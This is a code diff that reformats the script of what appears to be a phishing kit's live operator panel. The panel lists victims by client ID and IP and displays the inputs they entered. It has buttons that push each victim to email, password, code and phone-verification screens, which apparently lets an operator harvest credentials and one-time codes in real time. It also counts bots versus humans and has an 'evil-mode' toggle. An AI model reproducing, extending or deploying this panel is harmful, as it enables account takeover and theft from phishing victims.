@@ -269,171 +269,170 @@
       document.querySelector('.visits').classList.toggle('evil-mode', mode === 'evil-mode');
     }
   </script>
-  <script>
-  	const clientsDiv = document.getElementById('clients');
-  	
-   function updateCurrPage(clientId, currPage) {
-    const thisNameElements = document.querySelectorAll('.thisName');
-
-    thisNameElements.forEach(div => {
-        if (div.id == clientId) {
-        console.log("curpage: " + currPage);
-            div.parentElement.children[2].children[1].textContent = currPage;
-            if (currPage.toLowerCase() === "disconnected") {
-                document.getElementById(`currPage-${clientId}`).previousElementSibling.style.color = "red";
-            }
-        }
-    });
-}
   
-  function updateCount(visitor, bots, humans) {
-    let visitorCountStr = document.getElementById("visitors");
-    visitorCountStr.textContent = visitor.toString(); // Convert visitor to string
+  <script>
+    const clientsDiv = document.getElementById('clients');
 
-    let botSpan = document.querySelector('#bots');
-    botSpan.textContent = bots.toString(); // Convert bots to string
+    function updateCurrPage(clientId, currPage) {
+        const thisNameElements = document.querySelectorAll('.thisName');
 
-    let humanSpan = document.querySelector('#humans');
-    humanSpan.textContent = humans.toString(); // Convert humans to string
-}
-
-  // Modified updateClients function to include the currPage update
-  function updateClients(data) {
-    // Sort data.clientList by timestamp in descending order
-    data.clientList.sort((a, b) => b.timestamp - a.timestamp);
-
-    const clientsDiv = document.getElementById('clients');  // Ensure you have an element with this ID
-    clientsDiv.innerHTML = '';
-
-    data.clientList.forEach(client => {
-        const clientDiv = document.createElement('div');
-        clientDiv.classList.add('client');
-
-        const inputsHtml = Object.entries(client.inputs).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
-        clientDiv.innerHTML = `
-            <div style="display:flex; align-items:center;">
-                <div class="thisName" id="${client.clientId}"></div>
-                <h3 style="margin-right: 10px;">Client: ${client.clientId} IP: ${client.ip}</h3>
-                <div class="container">
-                    <div class="circle"></div>
-                    <div id="currPage-${client.clientId}" class="currPage"></div>
-                </div>
-            </div>
-            <button onclick="sendCommand('${client.clientId}', 'emailScreen')">Email Screen</button>
-            <button onclick="sendCommand('${client.clientId}', 'passwordScreen')">Password Screen</button>
-            <button onclick="sendCommand('${client.clientId}', 'loadScreen')">Load Screen</button>
-            <button onclick="sendCommand('${client.clientId}', 'codePage')">Code Page</button>
-            <button onclick="sendCommand('${client.clientId}', 'verifyPhone')">Verify Page</button>
-            <button onclick="sendCommand('${client.clientId}', 'loadPage')">Load Page</button>
-            <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
-            
-            <button onclick="deleteClient('${client.clientId}')">Delete</button>
-            <div id="inputs-${client.clientId}" class="inputs">
-                <h4>Inputs:</h4>
-                ${inputsHtml}
-            </div>
-        `;
-
-        // Prepend clientDiv to clientsDiv
-        clientsDiv.prepend(clientDiv);
-
-        // Call updateCurrPage with clientId and currPage
-        updateCurrPage(client.clientId, data.currPage.currPage);
-    });
-}
-    
-    async function sendCommand(clientId, command) {
-      try {
-        const response = await fetch('/send-command', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ clientId, command })
+        thisNameElements.forEach(div => {
+            if (div.id === clientId) {
+                console.log("curpage: " + currPage);
+                div.parentElement.children[2].children[1].textContent = currPage;
+                if (currPage.toLowerCase() === "disconnected") {
+                    document.getElementById(`currPage-${clientId}`).previousElementSibling.style.color = "red";
+                }
+            }
         });
-        if (!response.ok) {
-          alert('Failed to send command');
+    }
+
+    function updateCount(visitor, bots, humans) {
+        let visitorCountStr = document.getElementById("visitors");
+        visitorCountStr.textContent = visitor.toString(); // Convert visitor to string
+
+        let botSpan = document.querySelector('#bots');
+        botSpan.textContent = bots.toString(); // Convert bots to string
+
+        let humanSpan = document.querySelector('#humans');
+        humanSpan.textContent = humans.toString(); // Convert humans to string
+    }
+
+    // Modified updateClients function to include the currPage update
+    function updateClients(data) {
+        // Sort data.clientList by timestamp in descending order
+        data.clientList.sort((a, b) => b.timestamp - a.timestamp);
+
+        const clientsDiv = document.getElementById('clients');  // Ensure you have an element with this ID
+        clientsDiv.innerHTML = '';
+
+        data.clientList.forEach(client => {
+            const clientDiv = document.createElement('div');
+            clientDiv.classList.add('client');
+
+            const inputsHtml = Object.entries(client.inputs).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
+            clientDiv.innerHTML = `
+                <div style="display:flex; align-items:center;">
+                    <div class="thisName" id="${client.clientId}"></div>
+                    <h3 style="margin-right: 10px;">Client: ${client.clientId} IP: ${client.ip}</h3>
+                    <div class="container">
+                        <div class="circle"></div>
+                        <div id="currPage-${client.clientId}" class="currPage"></div>
+                    </div>
+                </div>
+                <button onclick="sendCommand('${client.clientId}', 'emailScreen')">Email Screen</button>
+                <button onclick="sendCommand('${client.clientId}', 'passwordScreen')">Password Screen</button>
+                <button onclick="sendCommand('${client.clientId}', 'loadScreen')">Load Screen</button>
+                <button onclick="sendCommand('${client.clientId}', 'codePage')">Code Page</button>
+                <button onclick="sendCommand('${client.clientId}', 'verifyPhone')">Verify Page</button>
+                <button onclick="sendCommand('${client.clientId}', 'loadPage')">Load Page</button>
+                <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
+                <button onclick="deleteClient('${client.clientId}')">Delete</button>
+                <div id="inputs-${client.clientId}" class="inputs">
+                    <h4>Inputs:</h4>
+                    ${inputsHtml}
+                </div>
+            `;
+
+            // Prepend clientDiv to clientsDiv
+            clientsDiv.prepend(clientDiv);
+
+            // Call updateCurrPage with clientId and currPage
+            updateCurrPage(client.clientId, data.currPage.currPage);
+        });
+    }
+
+    async function sendCommand(clientId, command) {
+        console.log('Sending command:', command, 'to clientId:', clientId); // Debugging statement
+        try {
+            const response = await fetch('/send-command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ clientId, command })
+            });
+            if (!response.ok) {
+                alert('Failed to send command');
+            }
+        } catch (error) {
+            console.error('Error sending command:', error);
+            alert('Error sending command');
         }
-      } catch (error) {
-        console.error('Error sending command:', error);
-        alert('Error sending command');
-      }
     }
 
     function viewInputs(clientId) {
-      const inputsDiv = document.getElementById(`inputs-${clientId}`);
-      inputsDiv.style.display = inputsDiv.style.display === 'none' ? 'block' : 'none';
+        const inputsDiv = document.getElementById(`inputs-${clientId}`);
+        inputsDiv.style.display = inputsDiv.style.display === 'none' ? 'block' : 'none';
     }
 
     async function deleteClient(clientId) {
-      try {
-        const response = await fetch('/delete-client', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ clientId })
-        });
-        if (!response.ok) {
-          alert('Failed to delete client');
+        try {
+            const response = await fetch('/delete-client', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ clientId })
+            });
+            if (!response.ok) {
+                alert('Failed to delete client');
+            }
+        } catch (error) {
+            console.error('Error deleting client:', error);
+            alert('Error deleting client');
         }
-      } catch (error) {
-        console.error('Error deleting client:', error);
-        alert('Error deleting client');
-      }
     }
 
     const eventSource = new EventSource('/events?admin=true');
     eventSource.onmessage = function(event) {
-      const data = JSON.parse(event.data);
-      if (data.type === 'adminUpdate') {
-      	//let currPage = (data.currPage); 
-      	console.log(data);
-        updateClients(data);
-        updateCount(data.stats.visitors, data.stats.bots, data.stats.humans);
-        
-      }
+        const data = JSON.parse(event.data);
+        if (data.type === 'adminUpdate') {
+            console.log(data);
+            updateClients(data);
+            updateCount(data.stats.visitors, data.stats.bots, data.stats.humans);
+        }
     };
 
     eventSource.onerror = function(error) {
-      console.error('EventSource failed:', error);
+        console.error('EventSource failed:', error);
     };
 
     // Load initial clients data if needed
     async function loadInitialClients() {
-      try {
-        const response = await fetch('/events?admin=true');
-        const data = await response.json();
-        updateClients(data.clientList);
-      } catch (error) {
-        console.error('Error loading initial clients:', error);
-      }
+        try {
+            const response = await fetch('/events?admin=true');
+            const data = await response.json();
+            updateClients(data.clientList);
+        } catch (error) {
+            console.error('Error loading initial clients:', error);
+        }
     }
 
     loadInitialClients();
-    
-        function startTimer(duration, display) {
-            let timer = duration, minutes, seconds;
-            setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
 
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
+    function startTimer(duration, display) {
+        let timer = duration, minutes, seconds;
+        setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
 
-                display.textContent = minutes + ":" + seconds;
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
 
-                if (--timer < 0) {
-                    location.reload();
-                }
-            }, 1000);
-        }
+            display.textContent = minutes + ":" + seconds;
 
-        window.onload = function () {
-            let threeMinutes = 60 * 3,
-                display = document.querySelector('.timer');
-            startTimer(threeMinutes, display);
-        };
-  </script>
+            if (--timer < 0) {
+                location.reload();
+            }
+        }, 1000);
+    }
+
+    window.onload = function () {
+        let threeMinutes = 60 * 3,
+            display = document.querySelector('.timer');
+        startTimer(threeMinutes, display);
+    };
+</script>
 </body>
 </html> 
